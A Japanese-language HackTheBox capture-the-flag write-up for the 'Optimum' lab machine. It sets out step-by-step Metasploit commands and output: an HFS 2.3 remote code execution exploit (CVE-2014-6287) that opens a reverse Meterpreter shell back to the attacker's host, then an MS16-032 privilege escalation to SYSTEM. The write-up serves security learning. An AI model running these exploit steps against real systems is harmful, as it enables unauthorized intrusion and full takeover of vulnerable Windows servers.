+++
title = "HackTheBox - Optimum Writeup"
date = "2026-04-13"
description = "HFS 2.3 RCE + MS16-032 による Windows Server 2012 R2 の完全攻略"
tags = ["HackTheBox", "CTF", "Windows", "CVE-2014-6287", "MS16-032", "Metasploit", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field       | Details                    |
|-------------|----------------------------|
| Machine     | Optimum                    |
| OS          | Windows Server 2012 R2 x64 |
| Difficulty  | Easy                       |
| IP          | 10.129.18.148              |


---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.18.148
```

```text
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

ポート 80 のみ開放。**Rejetto HttpFileServer (HFS) 2.3** が動作していることを確認。

---

## 脆弱性調査

HFS 2.3 は **CVE-2014-6287** として知られる Remote Code Execution (RCE) 脆弱性を持つ。

```bash
msf > search HttpFileServer 2.3
```

```text
exploit/windows/http/rejetto_hfs_exec  2014-09-11  excellent  Rejetto HttpFileServer Remote Command Execution
```

---

## Initial Access — Rejetto HFS RCE (CVE-2014-6287)

### Metasploit モジュール設定

```bash
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.129.18.148
set LHOST tun0   # → 10.10.16.166
run
```

```text
[*] Meterpreter session 1 opened (10.10.16.166:4444 -> 10.129.18.148:49162)
```

---

## Foothold

```bash
meterpreter > getuid
```

```text
Server username: OPTIMUM\kostas
```

---

## System Info

```bash
meterpreter > sysinfo
```

```text
Computer        : OPTIMUM
OS              : Windows Server 2012 R2 (6.3 Build 9600)
Architecture    : x64
Meterpreter     : x86/windows   ← 注意: x86 セッション
```

> OS は x64 だが Meterpreter は x86。権限昇格前にアーキテクチャの統一が必要。

---

## User Flag

```bash
meterpreter > cat "C:\\Users\\kostas\\Desktop\\user.txt"
```


---

## Post Exploitation — PrivEsc 候補の列挙

hfs.exe (x86) プロセスへマイグレートしてから `local_exploit_suggester` を実行。

```bash
meterpreter > migrate 2548   # hfs.exe

use post/multi/recon/local_exploit_suggester
set SESSION 2
run
```

主な候補：

| #  | Module                                          | Result                        |
|----|-------------------------------------------------|-------------------------------|
| 1  | bypassuac_comhijack                             | Vulnerable                    |
| 2  | bypassuac_eventvwr                              | Vulnerable                    |
| 3  | bypassuac_sluihijack                            | Vulnerable                    |
| 4  | cve_2020_0787_bits_arbitrary_file_move          | Possibly Vulnerable (2012 R2) |
| 5  | **ms16_032_secondary_logon_handle_privesc**     | Possibly Vulnerable           |
| 6  | tokenmagic                                      | Vulnerable                    |

---

## Privilege Escalation — MS16-032

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 2
set LHOST 10.10.16.166
run
```

```text
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[!] Holy handle leak Batman, we have a SYSTEM shell!!
[*] Meterpreter session 3 opened
```

セッションは取得できたが **Meterpreter が x86** のまま。  
x64 プロセスへマイグレートして昇格を完成させる。

---

## SYSTEM Shell — x64 プロセスへマイグレート

```bash
meterpreter > ps
# spoolsv.exe (PID 372) — NT AUTHORITY\SYSTEM, x64 を確認

meterpreter > migrate 372
```

```text
[*] Migration completed successfully.
```

```bash
meterpreter > sysinfo
```

```text
Architecture    : x64
Meterpreter     : x64/windows   ← x64 に昇格！
```

```bash
meterpreter > getuid
```

```text
Server username: NT AUTHORITY\SYSTEM
```

---

## Root Flag

```bash
meterpreter > shell
C:\Users\Administrator\Desktop> type root.txt
```


---

## Summary

```
Nmap → HFS 2.3 (port 80)
  ↓
CVE-2014-6287 (rejetto_hfs_exec) → OPTIMUM\kostas シェル取得
  ↓
local_exploit_suggester → MS16-032 特定
  ↓
ms16_032_secondary_logon_handle_privesc → SYSTEM セッション取得
  ↓
migrate 372 (spoolsv.exe / x64) → x64 SYSTEM 確立
  ↓
root.txt 取得 
```

---
